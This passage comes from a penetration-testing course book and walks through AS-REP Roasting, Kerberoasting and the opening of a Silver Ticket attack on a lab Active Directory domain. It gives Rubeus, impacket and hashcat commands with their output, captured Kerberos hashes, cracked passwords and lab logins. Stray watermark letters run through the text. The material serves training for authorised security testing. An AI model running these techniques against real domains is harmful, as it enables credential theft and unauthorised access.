n
As mentioned, we can also perform iAS-REP Roasting on Windows. We’ll use Rubeus,1109 which is
a toolset for raw Kerberos interzactions and abuses. To perform this attack, we’ll connect to
CLIENT75 via RDP as domain user jeff with the password HenchmanPutridBonbon11. Next, we
can start a PowerShell window and navigate to C:\Tools, where Rubeus.exe can be found.
D
Since we’re performing this attack as a pre-authenticated domain user, we don’t have to provide
any other options to Rubeus except asreproast. Rubeus will automatically identify vulnerable user
accounts. We also add the flag /nowrap to prevent new lines being added to the resulting AS-REP
hashes.
PS C:\Users\jeff> cd C:\Tools
PS C:\Tools> .\Rubeus.exe asreproast /nowrap
______ _
(_____ \ | |
_____) )_ _| |__ _____ _ _ ___
| __ /| | | | _ \| ___ | | | |/___)
| | \ \| |_| | |_) ) ____| |_| |___ |
|_| |_|____/|____/|_____)____/(___/
v2.1.2
1109 (Github, 2022), https://github.com/GhostPack/Rubeus
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 763
Made in Morocco
Penetration Testing with Kali Linux
[*] Action: AS-REP roasting
[*] Target Domain : corp.com
[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for
'(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
[*] SamAccountName : dave
[*] DistinguishedName : CN=dave,CN=Users,DC=corp,DC=com
[*] Using domain controller: DC1.corp.com (192.168.50.70)
[*] Building AS-REQ (w/o preauth) for: 'corp.com\dave'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:
$krb5asrep$PI:EMAIL:AE43CA9011CC7E7B9E7F7E7279DD7F2E$7D4yC59410DE2984EDF35053B7954
E6DC9A0D16CB5BE8E9DCACCA88C3C13C4031ABD71DA16F476EB972506B4989E9ABA2899C042E66792F33B1
19FAB1837D94EB654883C6C3F2DB6D4A8D44A8D9531C2661BDA4DD231FA985D7003E91F804ECF5FFC07433
33959470341032B146AB1DC9BD6B5E3F1C41BB02436D7181727D0C64k44D250E255B7261370BC8D4D418C24
2ABAE9A83C8908387A12D91B40B39848222F72C61DED5349D984FFC6D2A06A3A5BC19DDFF8A17EF5A22162
BAADE9CA8E48DD2E87BB7A7AE0DBFE225D1E4A778408B4933A254C30460E4190C02588FBADED757AA87A
s
Listing 808 - Using Rubeus to obtain the AS-REP hash of dave
Listing 808 shows that Rubeus identified dave as ovulnerable to AS-REP Roasting and displays the
AS-REP hash.
Next, let’s copy the AS-REP hash and pasnte it into a text file named hashes.asreproast2 in the
home directory of user kali. We can now start Hashcat again to crack the AS-REP hash.
kali@kali:~$ sudo hashcat -m 182i00 hashes.asreproast2 /usr/share/wordlists/rockyou.txt
-r /usr/share/hashcat/rules/bezst64.rule --force
...
$krb5asrep$PI:EMAIL:ae43ca9011cc7e7b9e7f7e7279dd7f2e$7d4c59410de2984edf35053b7954
D
e6dc9a0d16cb5be8e9dcacca88c3c13c4031abd71da16f476eb972506b4989e9aba2899c042e66792f33b1
19fab1837d94eb654883c6c3f2db6d4a8d44a8d9531c2661bda4dd231fa985d7003e91f804ecf5ffc07433
33959470341032b146ab1dc9bd6b5e3f1c41bb02436d7181727d0c6444d250e255b7261370bc8d4d418c24
2abae9a83c8908387a12d91b40b39848222f72c61ded5349d984ffc6d2a06a3a5bc19ddff8a17ef5a22162
baade9ca8e48dd2e87bb7a7ae0dbfe225d1e4a778408b4933a254c30460e4190c02588fbaded757aa87a:F
lowers1
...
Listing 809 - Cracking the modified AS-REP hash
Nice! Hashcat successfully cracked the AS-REP hash.
To identify users with the enabled AD user account option Do not require Kerberos
preauthentication, we can use PowerView’s Get-DomainUser function with the option -
PreauthNotRequired on Windows. On Kali, we can use impacket-GetNPUsers as shown in listing
805 without the -request and -outputfile options.
Let’s assume that we are conducting an assessment in which we cannot identify any AD users
with the account option Do not require Kerberos preauthentication enabled. While enumerating, we
notice that we have GenericWrite or GenericAll permissions1110 on another AD user account. Using
these permissions, we could reset their passwords, but this would lock out the user from
1110 (Active Directory Security, 2017), https://adsecurity.org/?p=3658
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 764
Made in Morocco
Penetration Testing with Kali Linux
accessing the account. We could also leverage these permissions to modify the User Account
Control value of the user to not require Kerberos preauthentication.1111 This attack is known as
Targeted AS-REP Roasting. Notably, we should reset the User Account Control value of the user
once we’ve obtained the hash.
In this section, we first explored the theory behind AS-REP Roasting. We then performed this
attack on Kali with impacket-GetNPUsers and on Windows with Rubeus. In the next section, we’ll
perform a similar attack, but instead of abusing a missing Kerberos preauthentication, we’ll target
SPNs.
22.2.3 Kerberoasting
Let’s recall how the Kerberos protocol works. We know that when a user wants to access a
resource hosted by a Service Principal Name (SPN), the client requests a service ticket that is
generated by the domain controller. The service ticket is then decyrypted and validated by the
application server, since it is encrypted via the password hash of the SPN.
k
When requesting the service ticket from the domain controller, no checks are performed to
confirm whether the user has any permissions to access the service hosted by the SPN.
s
These checks are performed as a second step only when connecting to the service itself. This
means that if we know the SPN we want to target, we can request a service ticket for it from the
o
domain controller.
The service ticket is encrypted using the SPN’s password hash. If we are able to request the ticket
n
and decrypt it using brute force or guessing, we can use this information to crack the cleartext
password of the service account. This technique is known as Kerberoasting.1112
i
In this section, we will abuse a szervice ticket and attempt to crack the password of the service
account. Let’s begin by connecting to CLIENT75 via RDP as jeff with the password
HenchmanPutridBonbon11.
D
To perform Kerberoasting, we’ll use Rubeus again. We specify the kerberoast command to launch
this attack technique. In addition, we’ll provide hashes.kerberoast as an argument for /outfile to
store the resulting TGS-REP hash in. Since we’ll execute Rubeus as an authenticated domain user,
the tool will identify all SPNs linked with a domain user.
PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
______ _
(_____ \ | |
_____) )_ _| |__ _____ _ _ ___
| __ /| | | | _ \| ___ | | | |/___)
| | \ \| |_| | |_) ) ____| |_| |___ |
|_| |_|____/|____/|_____)____/(___/
v2.1.2
1111 (Stealthbits Blog, 2019), https://stealthbits.com/blog/cracking-active-directory-passwords-with-as-rep-roasting/
1112 (Harmj0y Blog, 2019), https://blog.harmj0y.net/redteaming/kerberoasting-revisited/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 765
Made in Morocco
Penetration Testing with Kali Linux
[*] Action: Kerberoasting
[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*] Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
[*] Target Domain : corp.com
[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for
'(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAc
countControl:1.2.840.113556.1.4.803:=2)))'
[*] Total kerberoastable users : 1
[*] SamAccountName : iis_service
[*] DistinguishedName : CN=iis_service,CN=Users,DC=corp,DC=com
[*] ServicePrincipalName : HTTP/web04.corp.com:80 y
[*] PwdLastSet : 9/7/2022 5:38:43 AM
[*] Supported ETypes : RC4_HMAC_DEFAULT
[*] Hash written to C:\Tools\hashes.kerberoast k
Listing 810 - Utilizing Rubeus to perform a Kerberoast attack
s
Listing 810 shows that Rubeus identified one user account vulnerable to Kerberoasting and wrote
the hash to an output file.
o
Now, let’s copy hashes.kerberoast to our Kali machine. We can then review the Hashcat help for
the correct mode to crack a TGS-REP hash.
n
kali@kali:~$ cat hashes.kerberoast
$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:PI:EMAIL*$940AD9DCF5DD5CD8E91
A86D4BA0396DB$F57066A4F4F8FF5D70iDF39B0C98ED7948A5DB08D689B92446E600B49FD502DEA39A8ED3B
0B766E5CD40410464263557BC0E402z5BFB92D89BA5C12C26C72232905DEC4D060D3C8988945419AB4A7E7A
DEC407D22BF6871D...
...
D
kali@kali:~$ hashcat --help | grep -i "Kerberos"
19600 | Kerberos 5, etype 17, TGS-REP | Network Protocol
19800 | Kerberos 5, etype 17, Pre-Auth | Network Protocol
19700 | Kerberos 5, etype 18, TGS-REP | Network Protocol
19900 | Kerberos 5, etype 18, Pre-Auth | Network Protocol
7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth | Network Protocol
13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol
18200 | Kerberos 5, etype 23, AS-REP | Network Protocol
Listing 811 - Reviewing the correct Hashcat mode
The output of the second command in Listing 811 shows that 13100 is the correct mode to crack
TGS-REP hashes.
As in the previous section, we’ll start Hashcat with the arguments 13100 as mode, rockyou.txt as
wordlist, best64.rule as rule file, and --force as we perform the cracking in a VM.
kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
-r /usr/share/hashcat/rules/best64.rule --force
...
$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:PI:EMAIL*$940ad9dcf5dd5cd8e91
a86d4ba0396db$f57066a4f4f8ff5d70df39b0c98ed7948a5db08d689b92446e600b49fd502dea39a8ed3b
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 766
Made in Morocco
Penetration Testing with Kali Linux
0b766e5cd40410464263557bc0e4025bfb92d89ba5c12c26c72232905dec4d060d3c8988945419ab4a7e7a
dec407d22bf6871d
...
d8a2033fc64622eaef566f4740659d2e520b17bd383a47da74b54048397a4aaf06093b95322ddb81ce6369
4e0d1a8fa974f4df071c461b65cbb3dbcaec65478798bc909bc94:Strawberry1
...
Listing 812 - Cracking the TGS-REP hash
Great! We successfully retrieved the plaintext password of the user iis_service by performing
Kerberoasting.
Next, let’s perform Kerberoasting from Linux. We can use impacket-GetUserSPNs1113 with the IP
of the domain controller as the argument for -dc-ip. Since our Kali machine is not joined to the
domain, we also have to provide domain user credentials to obtain the TGS-REP hash. As before,
we can use -request to obtain the TGS and output them in a compatible format for Hashcat.
y
kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
k
Password:
ServicePrincipalName Name MemberOf PassswordLastSet LastLogon
Delegation
---------------------- ----------- -------- -------------------------- ---------
o
----------
HTTP/web04.corp.com:80 iis_service 2022-09-07 08:38:43.411468 
n
[-] CCache file is not found. Skipping...
$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$21b427f7d7befca7abfe9fa79ce4de
i
60$ac1459588a99d36fb31cee7aefb03cd740e9cc6d9816806cc1ea44b147384afb551723719a6d3b960ad
z
f6b2ce4e2741f7d0ec27a87c4c8bb4e5b1bb455714d3dd52c16a4e4c242df94897994ec0087cf5cfb16c2c
b64439d514241eec...
Listing 813 -D Using impacket-GetUserSPNs to perform Kerberoasting on Linux
Listing 813 shows that we successfully obtained the TGS-REP hash.
If impacket-GetUserSPNs throws the error “KRB_AP_ERR_SKEW(Clock skew too
great),” we need to synchronize the time of the Kali machine with the domain
controller. We can use ntpdate1114 or rdate1115 to do so.
Now, let’s store the TGS-REP hash in a file named hashes.kerberoast2 and crack it with Hashcat
as we did before.
kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt
-r /usr/share/hashcat/rules/best64.rule --force
...
1113 (Github, 2022), https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py
1114 (Wikipedia, 2021), https://en.wikipedia.org/wiki/Ntpdate
1115 (Wikipedia, 2021), https://en.wikipedia.org/wiki/Rdate
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 767
Made in Morocco
Penetration Testing with Kali Linux
$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$21b427f7d7befca7abfe9fa79ce4de
60$ac1459588a99d36fb31cee7aefb03cd740e9cc6d9816806cc1ea44b147384afb551723719a6d3b960ad
f6b2ce4e2741f7d0ec27a87c4c8bb4e5b1bb455714d3dd52c16a4e4c242df94897994ec0087cf5cfb16c2c
b64439d514241eec
...
a96a7e6e29aa173b401935f8f3a476cdbcca8f132e6cc8349dcc88fcd26854e334a2856c009bc76e4e2437
2c4db4d7f41a8be56e1b6a912c44dd259052299bac30de6a8d64f179caaa2b7ee87d5612cd5a4bb9f050ba
565aa97941ccfd634b:Strawberry1
...
Listing 814 - Cracking the TGS-REP hash
Listing 814 shows that we could successfully crack the TGS-REP hash again, providing the same
plaintext password as before.
This technique is immensely powerful if the domain contains high-privilege service accounts with
weak passwords, which is not uncommon in many organizations. Hoywever, if the SPN runs in the
context of a computer account, a managed service account,1116 or a group-managed service
account,1117 the password will be randomly generated, complex, and 120 characters long, making
k
cracking infeasible. The same is true for the krbtgt user account which acts as service account
for the KDC. Therefore, our chances of performing a successful Kerberoast attack against SPNs
s
running in the context of user accounts is much higher.
Let’s assume that we are performing an assessment and notice that we have GenericWrite or
o
GenericAll permissions1118 on another AD user account. As stated before, we could reset the
user’s password but this may raise suspicion. However, we could also set an SPN for the user,1119
kerberoast the account, and crack the passnword hash in an attack named targeted Kerberoasting.
We’ll note that in an assessment, we should delete the SPN once we’ve obtained the hash to
avoid adding any potential vulnerabilities to the client’s infrastructure.
i
We’ve now covered how an SPN czan be abused to obtain a TGS-REP hash and how to crack it. In
the next section, we’ll explore an attack utilizing a forged TGS.
D
22.2.4 Silver Tickets
In the previous section, we obtained and cracked a TGS-REP hash to retrieve the plaintext
password of an SPN. In this section, we’ll go one step further and forge our own service tickets.
Remembering the inner workings of the Kerberos authentication, the application on the server
executing in the context of the service account checks the user’s permissions from the group
memberships included in the service ticket. However, the user and group permissions in the
service ticket are not verified by the application in a majority of environments. In this case, the
application blindly trusts the integrity of the service ticket since it is encrypted with a password
hash that is, in theory, only known to the service account and the domain controller.
1116 (Tech Community Microsoft, 2019), https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-
accounts-understanding-implementing-best/ba-p/397009
1117 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-
accounts/group-managed-service-accounts-overview
1118 (Active Directory Security, 2017), https://adsecurity.org/?p=3658
1119 (Microsoft Documentation, 2016), https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-
and-2012/cc731241(v=ws.11)
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 768
Made in Morocco
Penetration Testing with Kali Linux
Privileged Account Certificate (PAC)1120 validation1121 is an optional verification process between
the SPN application and the domain controller. If this is enabled, the user authenticating to the
service and its privileges are validated by the domain controller. Fortunately for this attack
technique, service applications rarely perform PAC validation.
As an example, if we authenticate against an IIS server that is executing in the context of the
service account iis_service, the IIS application will determine which permissions we have on the
IIS server depending on the group memberships present in the service ticket.
With the service account password or its associated NTLM hash at hand, we can forge our own
service ticket to access the target resource (in our example, the IIS application) with any
permissions we desire. This custom-created ticket is known as a silver ticket1122 and if the service
principal name is used on multiple servers, the silver ticket can be leveraged against them all.
In this section’s example, we’ll create a silver ticket to get access to an HTTP SPN resource. As
y
we identified in the previous section, the iis_service user account is mapped to an HTTP SPN.
Therefore, the password hash of the user account is used to create service tickets for it. For the
k
purposes of this example, let’s assume we’ve identified that the iis_service user has an
established session on CLIENT75.
s
In general, we need to collect the following three pieces of information to create a silver ticket:
• SPN password hash o
• Domain SID
n
• Target SPN
Let’s get straight into the attack by connecting to CLIENT75 via RDP as jeff with the password
i
HenchmanPutridBonbon11.
z
First, let’s confirm that our current user has no access to the resource of the HTTP SPN mapped
to iis_service. To do so, weD’ll use iwr1123 and enter -UseDefaultCredentials so that the credentials
of the current user are used to send the web request.
PS C:\Users\jeff> iwr -UseDefaultCredentials http://web04
iwr :